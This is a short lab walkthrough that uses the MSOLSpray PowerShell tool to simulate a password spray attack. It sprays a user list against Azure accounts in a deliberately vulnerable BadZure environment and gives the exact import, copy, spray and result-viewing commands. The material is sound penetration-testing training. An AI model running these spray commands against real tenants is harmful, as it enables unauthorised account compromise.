### Run MSOLSpray to simulate a password spray attack
1. Import the MSOLSpray module
```
cd $env:SystemDrive\PentestTools\Azure\Attack\MSOLSpray
Import-Module .\MSOLSpray.ps1
```

2. Copy the users.txt file from the BadZure directory to the MSOLSpray directory
* This contains a list of users that will be targets for the password spray attack
```
Copy-Item -Path "$env:SystemDrive\PentestTools\Azure\VulnerableEnv\BadZure\users.txt" -Destination "$env:SystemDrive\PentestTools\Azure\Attack\MSOLSpray"
```

3. Run MSOLSpray
```
Invoke-MSOLSpray -UserList .\users.txt -Password "PASSWORD_FROM_THE_ATTACK_PATH_OUTPUT" -Verbose -OutFile .\sprayresults.txt
```
** Note the non-existent user and the user with MFA configured

4. View the result
* Notice that the user with the password from the attack path output was compromised
```
notepad sprayresults.txt
```